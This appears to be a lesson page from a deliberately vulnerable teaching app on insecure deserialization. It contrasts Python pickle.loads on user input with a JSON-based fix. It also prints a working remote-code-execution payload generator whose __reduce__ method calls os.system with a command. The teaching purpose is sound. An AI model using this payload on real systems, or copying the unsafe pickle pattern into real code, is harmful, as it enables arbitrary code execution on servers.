12. Insecure Deserialization

Mode: {{ mode }}

Vulnerability: The application deserializes user-provided data using Python's pickle, which can execute arbitrary code during unpickling.

Defense: Use JSON (a safe serialization format) instead of pickle. Never deserialize untrusted data.

Vulnerable Code

obj = pickle.loads(base64.b64decode(data))

Secure Code

obj = json.loads(base64.b64decode(data).decode())
Try: The default value is gANJNQAAAAA= which unpickles to the integer 5.

RCE Payload (vulnerable only — for educational purposes): 
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ("id",))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
